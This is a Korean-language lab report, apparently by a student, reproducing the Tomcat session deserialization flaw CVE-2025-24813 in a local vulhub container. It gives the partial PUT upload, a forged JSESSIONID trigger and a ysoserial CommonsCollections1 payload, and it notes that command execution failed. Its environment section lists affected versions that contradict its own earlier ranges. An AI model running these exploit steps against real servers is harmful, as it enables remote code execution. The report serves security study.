---

- from https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2025-24813

---

## CVE-2025-24813

## Tomcat Session Deserilization Remote Code

- Tomcat 세션 역직렬화를 통한 원격 코드 실행

| 영어 | 한글 | 설명 |
| --- | --- | --- |
| **Tomcat** | 톰캣 | Java 기반 웹 애플리케이션 서버 |
| **Session** | 세션 | 사용자 상태 정보를 저장하는 서버 측 데이터 |
| **Deserialization** | 역직렬화 | 저장된 데이터(바이트)를 다시 객체로 변환하는 과정 |
| **Remote Code Execution (RCE)** | 원격 코드 실행 | 공격자가 서버에서 임의의 코드를 실행할 수 있는 취약점 |
- 아파치 톰캣 서버에서, 클라이언트의 세션 정보를 역직렬화할 대 입력 값에 대한 검증이 미흡하여, 악의적인 객체를 역직렬화하면 서버에서 공격자가 의도한 코드를 원격으로 실행할 수 있는 취약점
- 이 역직렬화 취약점은 Apache Tomcat 11.0.0-M1부터 11.0.2, 10.1.0-M1부터 10.1.34, 9.0.0.M1부터 9.0.98 버전에서 발견되었음
- 이 취약점이 일어나기 위한 조건
    1. DefaultServlet 이 readonly=false로 설정된 경우
    2. 세션이 파일 기반(Filestore)으로 저장되도록 설정된 경우
- 공격자는 위 조건이 충족되면 이를 이용하여 서버에 임의의 파일을 업로드하고, 이후 조작된 JSESSIONID 쿠키를 통해 해당 파일을 역직렬화하게 만듦으로 원격 코드를 실행 할 수 있음

### 정리

- 취약 조건: writable DefaultServlet + file-based session 저장
- 공격 방식: 세션 ID를 조작하여 약성 객체 역직렬화 유도
- 위험도 : 매우 옾음(RCE가능)
- RCE(Remote Code Execution)
    - 서버 안에서 명령어나 스크립트를 실행 가능
    - 관리자 권한 획득, 백도어 설치, 데이터 유출 등 모든 공격의 출발점
    - 시스템 전체 장악 가능
    - EX) `curl http://target-site.com/exploit?cmd=whoami`

---

## 환경 세팅

- Apache Tomcat 6.0.0 - 6.0.53
- Apache Tomcat 7.0.0 - 7.0.100
- Apache Tomcat 8.0.x (중단됨)
- Apache Tomcat 9.0.0 - 특정 버전

⇒ 따라서 이 취약점을 테스트하기 위하여 Apache Tomcat 9.0.97 server를 이용

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/tomcat/CVE-2025-24813
docker compose build
docker compose up -d
```

⇒ 이후 브라우저에 [`http://localhost:8080`](http://localhost:8080/) 접속 환인을 통해 Tomcat의 실행을 확인

if 정상 ⇒ It works 메세지 확인 가능

![image.png](attachment:26b02693-ba3c-423b-be30-0a628807c2a1:image.png)

### 악의적인 세션 파일 업로드

### partial PUT 요청 전송

```bash
curl -X PUT "http://<localhost>:8080/deserialize/session" \
  -H "Content-Range: bytes 0-5/10" \
  -d "deserialize content"
```

### For 취약점 테스트 ⇒ 서버 확인 필요

1. readonly=false
2. File-based 세션

```bash
docker exec -it cve-2025-24813-tomcat-1 /bin/bash
cd /usr/local/tomcat/work/Catalina/localhost/ROOT
ls -al
```

- Tomcat은 `/deserialize/session` 경로를 `.deserialize.session` 파일로 저장
    
    ![image.png](attachment:c2e22779-60cb-42da-be35-a36096725b78:image.png)
    

⇒ 성공적으로 악의적인 세션이 업로드 되어 있는 것을 확인 가능

### 조작된 JSESSIONID 쿠키로 역직렬화 유도

```bash
curl -v http://localhost:8080/ \
  -H "Cookie: JSESSIONID=.deserialize"
```

```html
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/8.5.0
> Accept: */*
> Cookie: JSESSIONID=.deserialize
>
< HTTP/1.1 200 
< Content-Type: text/html;charset=UTF-8
< Transfer-Encoding: chunked
< Date: Sun, 27 Apr 2025 07:04:57 GMT
<

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/9.0.97</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />    
        <link href="tomcat.css" rel="stylesheet" type="text/css" />   
    </head>

    <body>
        <div id="wrapper">
            <div id="navigation" class="curved container">
                <span id="nav-home"><a href="https://tomcat.apache.org/">Home</a></span>
                <span id="nav-hosts"><a href="/docs/">Documentation</a></span>
                <span id="nav-config"><a href="/docs/config/">Configuration</a></span>
                <span id="nav-examples"><a href="/examples/">Examples</a></span>
                <span id="nav-wiki"><a href="https://cwiki.apache.org/confluence/display/TOMCAT/">Wiki</a></span>
                <span id="nav-lists"><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></span>
                <span id="nav-help"><a href="https://tomcat.apache.org/findhelp.html">Find Help</a></span>
                <br class="separator" />
            </div>
            <div id="asf-box">
                <h1>Apache Tomcat/9.0.97</h1>
            </div>
            <div id="upper" class="curved container">
                <div id="congrats" class="curved container">
                    <h2>If you're seeing this, you've successfully installed Tomcat. Congratulations!</h2>
                </div>
                <div id="notice">
                    <img id="tomcat-logo" src="tomcat.svg" alt="[tomcat logo]" />
                    <div id="tasks">
                        <h3>Recommended Reading:</h3>
                        <h4><a href="/docs/security-howto.html">Security Considerations How-To</a></h4>
                        <h4><a href="/docs/manager-howto.html">Manager Application How-To</a></h4>
                        <h4><a href="/docs/cluster-howto.html">Clustering/Session Replication How-To</a></h4>
                    </div>
                </div>
                <div id="actions">
                    <div class="button">
                        <a class="container shadow" href="/manager/status"><span>Server Status</span></a>
                    </div>
                    <div class="button">
                        <a class="container shadow" href="/manager/html"><span>Manager App</span></a>
                    </div>
                    <div class="button">
                        <a class="container shadow" href="/host-manager/html"><span>Host Manager</span></a>
                    </div>
                </div>
                <br class="separator" />
            </div>
            <div id="middle" class="curved container">
                <h3>Developer Quick Start</h3>
                <div class="col25">
                    <div class="container">
                        <p><a href="/docs/setup.html">Tomcat Setup</a></p>
                        <p><a href="/docs/appdev/">First Web Application</a></p>
                    </div>
                </div>
                <div class="col25">
                    <div class="container">
                        <p><a href="/docs/realm-howto.html">Realms &amp; AAA</a></p>
                        <p><a href="/docs/jndi-datasource-examples-howto.html">JDBC DataSources</a></p>
                    </div>
                </div>
                <div class="col25">
                    <div class="container">
                        <p><a href="/examples/">Examples</a></p>      
                    </div>
                </div>
                <div class="col25">
                    <div class="container">
                        <p><a href="https://cwiki.apache.org/confluence/display/TOMCAT/Specifications">Servlet Specifications</a></p>       
                        <p><a href="https://cwiki.apache.org/confluence/display/TOMCAT/Tomcat+Versions">Tomcat Versions</a></p>
                    </div>
                </div>
                <br class="separator" />
            </div>
            <div id="lower">
                <div id="low-manage" class="">
                    <div class="curved container">
                        <h3>Managing Tomcat</h3>
                        <p>For security, access to the <a href="/manager/html">manager webapp</a> is restricted.
                        Users are defined in:</p>
                        <pre>$CATALINA_HOME/conf/tomcat-users.xml</pre>
                        <p>In Tomcat 9.0 access to the manager application is split between
                           different users. &nbsp; <a href="/docs/manager-howto.html">Read more...</a></p>
                        <br />
                        <h4><a href="/docs/RELEASE-NOTES.txt">Release Notes</a></h4>
                        <h4><a href="/docs/changelog.html">Changelog</a></h4>
                        <h4><a href="https://tomcat.apache.org/migration.html">Migration Guide</a></h4>
                        <h4><a href="https://tomcat.apache.org/security.html">Security Notices</a></h4>
                    </div>
                </div>
                <div id="low-docs" class="">
                    <div class="curved container">
                        <h3>Documentation</h3>
                        <h4><a href="/docs/">Tomcat 9.0 Documentation</a></h4>
                        <h4><a href="/docs/config/">Tomcat 9.0 Configuration</a></h4>
                        <h4><a href="https://cwiki.apache.org/confluence/display/TOMCAT/">Tomcat Wiki</a></h4>
                        <p>Find additional important configuration information in:</p>
                        <pre>$CATALINA_HOME/RUNNING.txt</pre>
                        <p>Developers may be interested in:</p>       
                        <ul>
                            <li><a href="https://tomcat.apache.org/bugreport.html">Tomcat 9.0 Bug Database</a></li>
                            <li><a href="/docs/api/index.html">Tomcat 9.0 JavaDocs</a></li>
                            <li><a href="https://github.com/apache/tomcat/tree/9.0.x">Tomcat 9.0 Git Repository at GitHub</a></li>
                        </ul>
                    </div>
                </div>
                <div id="low-help" class="">
                    <div class="curved container">
                        <h3>Getting Help</h3>
                        <h4><a href="https://tomcat.apache.org/faq/">FAQ</a> and <a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></h4>
                        <p>The following mailing lists are available:</p>
                        <ul>
                            <li id="list-announce"><strong><a href="https://tomcat.apache.org/lists.html#tomcat-announce">tomcat-announce</a><br />
                                Important announcements, releases, security vulnerability notifications. (Low volume).</strong>
                            </li>
                            <li><a href="https://tomcat.apache.org/lists.html#tomcat-users">tomcat-users</a><br />
                                User support and discussion
                            </li>
                            <li><a href="https://tomcat.apache.org/lists.html#taglibs-user">taglibs-user</a><br />
                                User support and discussion for <a href="https://tomcat.apache.org/taglibs/">Apache Taglibs</a>
                            </li>
                            <li><a href="https://tomcat.apache.org/lists.html#tomcat-dev">tomcat-dev</a><br />
                                Development mailing list, including commit messages
                            </li>
                        </ul>
                    </div>
                </div>
                <br class="separator" />
            </div>
            <div id="footer" class="curved container">
                <div class="col20">
                    <div class="container">
                        <h4>Other Downloads</h4>
                        <ul>
                            <li><a href="https://tomcat.apache.org/download-connectors.cgi">Tomcat Connectors</a></li>
                            <li><a href="https://tomcat.apache.org/download-native.cgi">Tomcat Native</a></li>
                            <li><a href="https://tomcat.apache.org/taglibs/">Taglibs</a></li>
                            <li><a href="/docs/deployer-howto.html">Deployer</a></li>
                        </ul>
                    </div>
                </div>
                <div class="col20">
                    <div class="container">
                        <h4>Other Documentation</h4>
                        <ul>
                            <li><a href="https://tomcat.apache.org/connectors-doc/">Tomcat Connectors</a></li>
                            <li><a href="https://tomcat.apache.org/connectors-doc/">mod_jk Documentation</a></li>
                            <li><a href="https://tomcat.apache.org/native-doc/">Tomcat Native</a></li>
                            <li><a href="/docs/deployer-howto.html">Deployer</a></li>
                        </ul>
                    </div>
                </div>
                <div class="col20">
                    <div class="container">
                        <h4>Get Involved</h4>
                        <ul>
                            <li><a href="https://tomcat.apache.org/getinvolved.html">Overview</a></li>
                            <li><a href="https://tomcat.apache.org/source.html">Source Repositories</a></li>
                            <li><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></li>
                            <li><a href="https://cwiki.apache.org/confluence/display/TOMCAT/">Wiki</a></li>
                        </ul>
                    </div>
                </div>
                <div class="col20">
                    <div class="container">
                        <h4>Miscellaneous</h4>
                        <ul>
                            <li><a href="https://tomcat.apache.org/contact.html">Contact</a></li>
                            <li><a href="https://tomcat.apache.org/legal.html">Legal</a></li>
                            <li><a href="https://www.apache.org/foundation/sponsorship.html">Sponsorship</a></li>
                            <li><a href="https://www.apache.org/foundation/thanks.html">Thanks</a></li>
                        </ul>
                    </div>
                </div>
                <div class="col20">
                    <div class="container">
                        <h4>Apache Software Foundation</h4>
                        <ul>
                            <li><a href="https://tomcat.apache.org/whoweare.html">Who We Are</a></li>
                            <li><a href="https://tomcat.apache.org/heritage.html">Heritage</a></li>
                            <li><a href="https://www.apache.org">Apache Home</a></li>
                            <li><a href="https://tomcat.apache.org/resources.html">Resources</a></li>
                        </ul>
                    </div>
                </div>
                <br class="separator" />
            </div>
            <p class="copyright">Copyright &copy;1999-2025 Apache Software Foundation.  All Rights Reserved</p>
        </div>
    </body>

</html>

```

⇒ 다음처럼 파일이 역직렬화 시도를 확인할 수 있음

### 역직렬화 시도 But 아무 일도 없음 Why?

- 위에서 시도한 내용은 일반 문자열 ⇒  따라서 Tomcat의 입장에서는 Java 객체 직렬화 포맷이 아니기에 실패하거나 무시함

### 역직렬화 ⇒ 실행

- Java 직렬화된 payload 객체를 만들어서 업로드해야 함
- ysoserialdmf 이용 : 악성 Java 객체 자동 생성기
- https://github.com/frohoff/ysoserial.git

```html
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package
```

⇒ 성공하면 `target/ysoserial-*.jar` 이 생성됨

![image.png](attachment:af0ea501-edef-429e-83a5-58d9492575cd:image.png)

### 실제 명령 실행용 payload && 트리거

```bash
java -jar target/ysoserial-*.jar CommonsCollections1 "touch /tmp/hacked_by_deser" > /usr/local/tomcat/work/Catalina/localhost/ROOT/.deserialize.session
curl -v http://localhost:8080/ -H "Cookie: JSESSIONID=.deserialize"
```

![image.png](attachment:8e6e47fa-f922-4cef-b6bb-35ad3429faf4:image.png)

`ls /tmp/` 로 결과 확인

- 처음 생성한 `.deserialize.session` 과 충돌이 발생할 수 있으니 제거 후 다시 생성을 추천

## 실패할 수 도 있음

| 단계 | 결과 |
| --- | --- |
| ysoserial payload 생성 | ✅ 성공 |
| `.session` 파일 저장 | ✅ 성공 |
| `curl`로 JSESSIONID 트리거 | ✅ 성공 (200 OK) |
| 웹 루트 또는 `/tmp/`에 파일 생성 명령 실행 | ❌ 실패 (결과 없음) |

## 원인 분석

이럴 때 가장 흔한 이유는 다음 중 하나야:

1. **Tomcat이 `Runtime.exec()` 또는 `ProcessBuilder` 같은 기능을 차단함**
2. Java 버전의 보안 정책 혹은 컨테이너 내 권한 문제로 **명령이 무시됨**
3. 명령은 실행됐지만 **출력 또는 파일이 남지 않게 설계된 환경**

- 역직렬화 트리거 후, 특정 gadget (`CommonsCollections1`)을 활용해 명령 실행을 시도하였으나, 컨테이너 내 보안 설정 또는 JDK의 제한으로 인해 실제 명령 실행 효과(파일 생성)는 관찰되지 않았다.
- 향후 보안 점검 시, 이러한 **역직렬화 트리거 자체**만으로도 **잠재적 RCE 위협**이 존재한다는 점을 고려해야 한다.

본 보고서는 `vulhub` 기반으로 구성한 Tomcat CVE-2025-24813 환경에서 PoC 실험을 수행하고, 취약점 유효성과 실행 결과를 기반으로 작성되었습니다.

> GitHub 실습 URL: https://github.com/yourid/kr-vulhub/tree/main/tomcat/CVE-2025-24813
>
